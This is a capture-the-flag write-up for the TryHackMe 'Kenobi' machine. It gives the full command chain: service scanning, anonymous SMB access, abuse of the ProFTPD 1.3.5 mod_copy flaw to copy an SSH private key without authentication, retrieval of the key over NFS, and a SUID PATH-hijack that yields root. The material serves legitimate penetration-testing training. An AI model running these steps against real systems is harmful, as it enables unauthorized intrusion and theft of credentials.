# Kenobi

## 1. Introduction

### 1.1 Background

**Kenobi** is an _Easy_ Linux machine on the **TryHackMe** platform.  
The objective is to compromise the system by enumerating exposed services and chaining vulnerabilities until obtaining **root** privileges.

### 1.2 Objectives

- Enumerate exposed services.
- Obtain initial access as a user.
- Escalate privileges to root. 

---

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```bash
❯ ping -c1 kenobi.thm
```

The host responds correctly, confirming that it is active.

### 2.2 Nmap

We perform a full port scan:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 kenobi.thm -oN allports --open
```

Relevant open ports:

- 21 → FTP  
- 22 → SSH  
- 80 → HTTP  
- 111 → rpcbind  
- 139 / 445 → SMB  
- 2049 → NFS  
- High ports associated with mountd and nlockmgr  

Then we execute a more detailed scan:

```bash
❯ nmap -p21,22,80,111,139,445,2049,37971,38643,41655,55659 -sCV -Pn -oN targeted kenobi.thm
```

Identified services:

- **FTP** → ProFTPD 1.3.5  
- **SSH** → OpenSSH 8.2p1 (Ubuntu)  
- **HTTP** → Apache 2.4.41  
- **SMB** → Samba 4.6.2  
- **NFS** → Exports `/var`  

### 2.3 SMB Enumeration

We list shared resources:

```bash
❯ smbmap -H 10.49.177.253
```

An `anonymous` share with read-only permissions is detected.

We access it:

```bash
❯ smbclient //10.49.177.253/anonymous -N
```

We download `log.txt`.

### 2.3 log.txt Analysis

The file contains:

- SSH key generation for user `kenobi`  
- ProFTPD configuration  
- Full Samba configuration  
- Confirmation that FTP runs as user `kenobi`  

This suggests that the SSH private key is located at:

```
/home/kenobi/.ssh/id_rsa
```

---

## 3. Exploitation  

### 3.1 ProFTPD mod_copy

We search for exploits:

```bash
❯ searchsploit ProFTPD 1.3.5
```

A vulnerability is confirmed in the `mod_copy` module, which allows copying files **without authentication** using `SITE CPFR` and `SITE CPTO`.

### 3.1 Copying the Private Key

We connect via netcat:

```bash
❯ nc 10.49.177.253 21
```

We execute:

```bash
site cpfr /home/kenobi/.ssh/id_rsa  
site cpto /var/tmp/id_rsa
```

The key is copied to `/var/tmp/id_rsa`.

### 3.2 Access via NFS

Since `/var` is exported via NFS:

```bash
❯ showmount -e 10.49.177.253
```

We mount the resource on our attacker machine:

```bash
❯ mkdir /mnt/kenobi
❯ mount 10.49.177.253:/var/tmp/ /mnt/kenobi
```

We access the copied file:

```bash
❯ cd /mnt/kenobi  
❯ cp id_rsa ~/Desktop
❯ cd ~/Desktop   
❯ chmod 600 id_rsa
```

We connect via SSH:

```bash
❯ ssh kenobi@10.49.177.253 -i id_rsa
```

Successful access as user:

```
kenobi
```

---

## 4. Privilege Escalation

### 4.1 menu Binary Analysis

We search for SUID binaries:

```bash
❯ find / -perm -4000 2>/dev/null
```

Highlighted:

```
/usr/bin/menu
```

When executed:

```
❯ /usr/bin/menu
```

It shows three options:

1. status check  
2. kernel version  
3. ifconfig  

Option 3 executes `ifconfig`, but without an absolute path.

We check the PATH:

```bash
❯ echo $PATH
```

The current directory is not first in the PATH.

### 4.2 Root

We create a malicious file named `ifconfig`:

```bash
❯ echo /bin/bash > ifconfig  
❯ chmod 777 ifconfig
```

We modify the PATH:

```bash
❯ export PATH=.:$PATH
```

We execute again:

```bash
❯ /usr/bin/menu
```

We select option 3.

The system executes our `ifconfig`, granting a shell as:

```
root
```

Verification:

```bash
❯ whoami
root
```
